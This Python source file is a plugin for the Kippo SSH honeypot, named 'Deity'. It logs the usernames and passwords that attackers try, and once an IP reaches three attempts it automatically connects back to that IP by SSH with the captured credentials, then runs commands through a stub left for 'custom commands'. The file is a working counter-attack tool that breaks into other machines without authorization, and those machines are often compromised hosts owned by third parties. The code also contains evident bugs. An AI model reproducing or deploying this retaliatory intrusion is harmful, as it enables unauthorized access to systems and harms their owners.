####
#
# By R4stl1n 
# 
# This is our "hooker" since it is easier than rewriting code
#
import sys

from threading import Thread
from kippo.core import dblog
from twisted.enterprise import adbapi
from twisted.internet import defer
from twisted.python import log
from paramiko import SSHClient
from paramiko import AutoAddPolicy

import time
import uuid

class UserIpCombination:
    def __init__(self,target,username,password):
        self.target = target
        self.usernames = []
        self.passwords = []
        self.amount = 0

    def reset(self):
        self.usernames = []
        self.passwords = []
        self.amount = 0

class Connection (Thread):

    def __init__(self,combination, logger):
        super(Connection, self).__init__()
        self.portNumber  = 2222
        self.timeoutTime = 5
        self.target = combination.target
        self.combination = combination
        self.logger = logger

    def run(self):
        for usernameC in self.combination.usernames:

            for passwordC in self.combination.passwords:
                sshConnection = SSHClient()

                sshConnection.set_missing_host_key_policy(AutoAddPolicy())     
                try:
                    print "[*Deity*] Attempting Access to: "+self.target

                    sshConnection.connect(self.target, port = self.portNumber, username = usernameC,password = passwordC, timeout = self.timeoutTime, allow_agent = False,look_for_keys = False)
                    print "[*Deity*] Access Granted to: "+self.target
                    self.commandsToExecute(sshConnection)
                    sshConnection.close()
                except:      
                    pass

    def commandsToExecute(sshConnection):
        #Added your custom commands like so
        #
        #stdin, stdout, stderr = client.exec_command('ls')
        #for line in stdout:
        #print '... ' + line.strip('\n')
        print "[*Deity*] Executing Commands on: "

class Deity:

    def __init__(self,logger):
        self.currentCombinations = []
        self.connections = []
        self.logger = logger

    def __del__(self):
        for connection in self.connections:
            connection.join()

    def addCombinationEntry(self,ip,username,password):
        found = False

        for combination in self.currentCombinations:
            if combination.target == ip:
                found = True
                self.logger.write(self.logger,"[*Deity*] Added "+username+":"+password+" for combination: "+ip)
                combination.usernames.append(username)
                combination.passwords.append(password)
                combination.amount = combination.amount + 1
                if combination.amount >= 3:
                    self.logger.write(self.logger,"[*Deity*] Attack identified, Smiting: " + ip)
                    connection = Connection(combination, self.logger)
                    connection.start()
                    self.connections.append(connection)
                    combination.reset()

        if found == False:
            self.logger.write(self.logger,"[*Deity*] Added new combination for ip: %s"%ip)
            combination = UserIpCombination(ip,username,password)
            self.currentCombinations.append(combination)

class DBLogger(dblog.DBLogger):

    def __init__(self, cfg):
        self.peerIP = None
        self.peerPort = None
        self.deity = Deity(self)
        super(DBLogger,self).__init__(cfg)

    def start(self, cfg):
        self.outfile = file(cfg.get('database_deity', 'logfile'), 'a')

    def write(self, session, msg):
        self.outfile.write('%s [%s]: %s\r\n' % \
            (session, time.strftime('%Y-%m-%d %H:%M:%S'), msg))
        self.outfile.flush()

    def createSession(self, peerIP, peerPort, hostIP, hostPort):
        sid = uuid.uuid1().hex
        sensorname = self.getSensor() or hostIP
        self.peerIP = peerIP
        self.peerPort = peerPort
        self.write(sid, 'New connection: %s:%s' % (peerIP, peerPort))
        return sid

    def handleConnectionLost(self, session, args):
        #self.write(session, 'Connection lost')
        pass

    def handleLoginFailed(self, session, args):
        self.deity.addCombinationEntry(self.peerIP,args['username'],args['password'])
        self.write(session, 'Login failed [%s/%s]' % \
            (args['username'], args['password']))

    def handleLoginSucceeded(self, session, args):
        self.deity.addCombinationEntry(self.peerIP,args['username'],args['password'])
        self.write(session, 'Login succeeded [%s/%s]' % \
            (args['username'], args['password']))

    def handleCommand(self, session, args):
        pass
        #self.write(session, 'Command [%s]' % (args['input'],))

    def handleUnknownCommand(self, session, args):
        pass
        #self.write(session, 'Unknown command [%s]' % (args['input'],))

    def handleInput(self, session, args):
        pass
        #self.write(session, 'Input [%s] @%s' % (args['input'], args['realm']))

    def handleTerminalSize(self, session, args):
        pass
        #self.write(session, 'Terminal size: %sx%s' % \
        #    (args['width'], args['height']))

    def handleClientVersion(self, session, args):
        pass
        #self.write(session, 'Client version: [%s]' % (args['version'],))

    def handleFileDownload(self, session, args):
        pass
        #self.write(session, 'File download: [%s] -> %s' % \
        #    (args['url'], args['outfile']))

# vim: set sw=4 et:
